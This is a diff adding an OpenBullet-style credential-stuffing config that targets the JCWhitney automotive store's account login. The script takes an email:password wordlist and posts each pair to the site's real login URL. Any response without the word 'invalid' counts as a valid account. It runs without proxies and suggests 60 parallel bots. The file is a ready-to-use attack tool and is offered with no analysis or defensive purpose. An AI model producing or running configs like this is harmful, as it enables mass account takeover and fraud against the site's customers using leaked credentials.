@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "JCWhitney",
+  "SuggestedBots": 60,
+  "LastModified": "2018-09-25T04:12:29.9531726+00:00",
+  "AdditionalInfo": "Automotive - Proxyless - ",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 1779075004
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://myaccount.jcwhitney.com/login " AutoRedirect=TRUE 
+  CONTENT "username=<USER>&loginPassword=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://myaccount.jcwhitney.com/login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "invalid" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "invalid" 
